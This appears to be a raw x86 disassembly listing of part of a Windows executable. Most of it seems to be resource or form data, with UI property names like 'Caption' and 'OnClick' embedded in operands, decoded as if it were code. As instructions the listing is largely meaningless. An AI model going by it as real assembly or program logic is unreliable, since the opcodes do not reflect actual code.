test eax 0x68ff0001
dec eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : ebx ] cl
push ds
add [ esi + eax * 2 ] al
outsd
outsb
je r-xdata
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add ah bh
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0021 ] al
je r-xdata
fwait
inc ebx
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
mov [ gs : ebx + eax * 2 + 0x18800 ] bl
dec [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
inc ebx
push 0x65676e61
fcom [ eax ]
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
fcom [ gs : eax ]
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax ]
inc ebx
add ah bl
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
aad 0x44
add [ eax + eax ] bh
sub_431bc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + eax * 2 ] bl
add [ eax + eax ] ch
add [ eax ] al
sbb [ ebx + 0x34b40043 ] bl
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
fcomp [ ebx + 0x69140041 ]
inc ebx
add [ eax ] dl
pushfd
inc ecx
add [ eax ] ch
into
inc ebx
add [ esp + ebx * 4 + 0x41 ] al
add ah dl
into
inc ebx
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
add [ ecx * 8 + 0x69380043 ] dl
inc ebx
add [ eax + 0x4c0043cd ] cl
movsd [ edi ] [ esi ]
inc esp
add [ esp + eax ] dl
inc esp
add [ eax ] al
iretd
sub_431c42
inc ebx
add [ ebp + ecx * 8 - 0x5a63ffbd ] bh
inc esp
add [ eax - 0xbffbb5b ] dh
int 0x43
add al bl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x32 ] dl
inc ebx
add [ eax + 0x69 ] dh
inc ebx
add [ eax - 0x32 ] dh
inc ebx
add al ch
movsd [ edi ] [ esi ]
inc esp
add [ esp + eax ] bl
inc esp
add [ edi + ecx * 8 + 0x43 ] ah
add [ edi + ecx * 8 - 0x316fffbd ] ah
inc ebx
add ah bh
movsd [ edi ] [ esi ]
inc esp
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc esp
add [ esi + ecx * 8 - 0x33dbffbd ] dh
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
fadd [ ebx ]
or [ ebx - 0x680fffbf ] bl
je r-xdata
inc esp
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + 0x6a ] bh
inc ebx
add [ edx + ebp * 2 + 0x40043 ] bl
cmp [ ebp - 0x10ffec ] bh
fcos
sbb [ ebx + 0x43 ] ch
add [ ebx + ebp * 2 + 0x43 ] ah
add [ eax ] ch
push 0x43
add [ eax + 0x6a ] dh
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ eax + 0x4c00436a ] ah
add al [ eax + eax + 0x2c ]
inc ebp
inc esp
add al ch
inc ebp
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add [ eax - 0x7fffbc95 ] dl
sbb [ eax + eax - 0x50 ] al
push ss
inc esp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add ah dl
imul eax [ ebx ] sub_444d24
inc eax
push edx
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x1ce8c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
sbb eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xd200431d
sbb eax 0x20c0043
add [ eax ] al
in al dx
popfd
inc ebx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
add eax 0x52100044
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
push es
add [ eax + 0x22 ] dh
je r-xdata
inc esp
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + 0x6a ] bh
inc ebx
add [ edx + ebp * 2 + 0x6c540043 ] bl
inc ebx
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ eax + 0x4c00436a ] ah
add al [ eax + eax + 0x2c ]
inc ebp
inc esp
add al ch
inc ebp
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add ah bl
insb
inc ebx
add [ eax + 0x18004418 ] al
insd
inc ebx
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
enter 0x4034 0x0
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
dec eax
inc [ ebp + ebp * 2 + 0x43 ]
add [ ebp + ebp * 2 + 0x6e380043 ] dh
inc ebx
add [ eax ] dh
insd
inc ebx
add [ eax - 0x73ffbc92 ] bh
outsb
inc ebx
add [ esp + ebp * 2 ] ch
inc ebx
add [ eax + 0x6c ] dl
inc ebx
add [ edi ] al
push esp
inc edx
jne r-xdata
in al dx
push es
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
add eax 0x52100044
inc esp
xor al [ eax ]
and [ edx ] dh
inc eax
add [ eax + 0x5 ] cl
inc esp
add [ eax ] dl
push edx
outsd
insb
lea eax [ eax ]
call 0x7436106
push cs
push esp
inc edx
jne r-xdata
add dh bh
call sub_4363c1
add [ eax ] al
add [ eax ] 0x0
je r-xdata
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
inc esp
add [ edi + edi - 0x33ffbf ] al
inc ebx
add [ ebx + edx * 8 + 0x6ec0043 ] dl
je r-xdata
push [ eax ]
outsb
mov eax eax
jo r-xdata
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] ah
and eax 0x3c0041
add dh bh
cmp dl dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and [ esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
int3
outsd
insb
call 0xffffffffa0436119
mov eax [ 0xb0043 ]
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
xchg esp eax
cmovno eax [ eax ]
pop edi
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add al cl
imul eax [ ebx ] 0x24
dec ebp
inc esp
add [ eax + 0x52 ] al
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
insb
jae r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add [ eax + 0x4208000d ] al
outsb
pop esp
push ds
inc ebx
add ah ah
sbb eax 0x310043
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ ebp + 0x1e5c0040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1f ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
pop ds
inc ebx
add [ edx + 0x1f ] ah
inc ebx
add [ eax ] bl
add al [ eax ]
add [ esp + ebx - 0x650fffbd ] bl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
[ eax + 0x100436c ]
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
enter 0x438d 0x0
insb
jae r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
add [ eax ] al
[ eax ]
rol [ ebx ] cl
mov ah 0xd2
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sub_4323c1
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebx
jns r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
loopne r-xdata
jo r-xdata
pop [ ebx ]
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
lodsb [ esi ]
nop
inc ebx
add al ah
add [ eax ] eax
jmp eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
pop [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
add [ eax ] al
pushfd
sbb al 0x43
add al dh
0x34c00041 0x40
inc esp
adc al 0x2
push ebp
jo r-xdata
jns r-xdata
je r-xdata
arpl [ ebx - 0x30 ] bp
xchg ecx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
inc esp
add [ edi + eax * 2 ] cl
add [ eax - 0x21 ] bl
inc ebx
add [ eax + 0x4c00436a ] ah
add al [ eax + eax + 0x2c ]
inc ebp
inc esp
add al ch
inc ebp
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add ah dh
jo r-xdata
outsb
push ebx
je r-xdata
dec edi
test [ edi + 0xe00043 ] cl
add bh bh
outsd
jbe r-xdata
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
sub eax [ eax ]
pop es
dec edi
nop
inc ebx
add al bl
add [ eax ] eax
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
add [ ebx + edx * 8 + 0x6ec0043 ] dl
jb r-xdata
cld
xor [ ecx + 0x43 ] 0x0
add al 0x72
inc ebx
add [ edi + ebp * 2 + 0x43 ] ch
add [ eax + 0x4c004418 ] al
jno r-xdata
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
add eax 0x52100044
jb r-xdata
fwait
inc ecx
add [ edi + ebp * 2 ] al
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
call 0x104366ec
inc esp
jb r-xdata
push [ eax ]
add dh bh
call sub_436aa2
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
lea eax [ ebx ]
insb
jae r-xdata
add [ esp + edx * 2 ] cl
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
sub [ esi ] ah
inc ebx
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
sub al 0x25
inc ebx
add ah ah
sbb eax 0x350043
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
insb
outsd
inc ebx
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ edi + ebp * 2 + 0x43 ] ah
add [ eax + 0x70 ] ch
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x78ff
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
inc esp
add [ eax ] dl
push edx
inc esp
outsd
in al dx
push es
sub al 0x25
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
and eax 0x26160043
inc ebx
add [ edx + eax ] dl
cwde
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
and [ esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] ah
and eax 0x3c0041
add dh bh
cmp dl dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
insb
cmovno eax [ eax ]
adc [ edx ] al
add bh bh
and al 0x43
add [ eax ] al
add [ eax ] al
add [ 0x11ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xchg esp eax
cmovno eax [ eax ]
pop edi
add [ eax ] al
mov es [ ebx ]
je r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax - 0x7a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
dec [ eax + 0x10043e0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push ebx
lea eax [ ebx ]
xchg esp eax
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
jae r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
aad 0x44
add [ eax + eax ] bh
in al 0xdd
inc ebx
add [ edi + edi * 8 + 0x43 ] cl
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
mov ah 0x6b
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x38ff0000 0x43e0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add bh bh
mov eax 0xc80043df
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ecx + ecx * 2 ]
outsb
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
dec eax
inc esp
add [ ecx + ecx * 2 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0x68ff0001
dec eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add al 0x46
outsd
outsb
je r-xdata
add [ eax ] al
sbb [ eax ] 0x0
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax ]
inc ebx
add ah bl
fild [ ebx ]
add [ eax ] al
dec ebx
jns r-xdata
fcom [ bx + si ]
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
rol [ ecx ] 0x0
jo r-xdata
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx ] cl
add al [ eax ]
push [ ebx + ebp * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] al
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
lodsb [ esi ]
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
nop
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
pop [ ebx ]
lodsb [ esi ]
nop
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
adc [ ecx ] al
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
sbb [ edx + 0x1080043 ] dl
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
pop [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x18 ] bp
xchg edx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
jo r-xdata
outsb
push ebp
jo r-xdata
push ebp
jo r-xdata
arpl [ ebx - 0x30 ] bp
xchg ecx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
inc esp
outsd
ja r-xdata
jb r-xdata
insb
insb
inc ebx
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ esp + ebp ] ch
inc ebx
add [ eax ] cl
jae r-xdata
outsb
push ebx
je r-xdata
dec edi
test [ edi + 0xe00043 ] cl
add bh bh
add [ eax ] al
jmp eax
pushad
nop
inc ebx
add al ch
add [ eax ] eax
das
add [ edi ] al
dec edi
nop
inc ebx
add al bl
add [ eax ] eax
outsb
add [ ecx ] cl
dec edi
xchg edx eax
inc ebx
add [ eax ] cl
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9422a38
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
or [ ebx + 0x63 ] dh
push eax
popad
jae r-xdata
outsd
jbe r-xdata
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
jae r-xdata
jb r-xdata
cld
add [ eax ] al
add [ eax ] al
push esp
jae r-xdata
or [ esp + edx * 2 ] cl
dec esp
imul ebp [ esi + 0x65 ] 0x730a7055
arpl [ ecx + ebp * 2 + 0x6e ] cx
inc esp
outsd
ja r-xdata
or dh [ ebx + 0x63 ]
jae r-xdata
inc ebp
jbe r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x6e776f44
push ebp
jo r-xdata
arpl [ eax + 0x61 ] dx
jb r-xdata
arpl [ edx + 0x6f ] si
insb
insb
push eax
push esp
outsd
jo r-xdata
arpl [ edx + 0x6f ] si
insb
insb
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc esp
jb r-xdata
inc esp
add [ edi + eax * 2 ] cl
add [ eax - 0x21 ] bl
inc ebx
add [ ecx ] cl
inc esp
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc eax
add [ eax + 0x800432c ] dh
or al 0x54
add [ eax ] al
add [ esi + ebp ] bl
inc ebx
add [ edx + 0x2e ] al
inc ebx
add [ eax ] bh
add al [ eax ]
add ah ch
popfd
inc ebx
add al dh
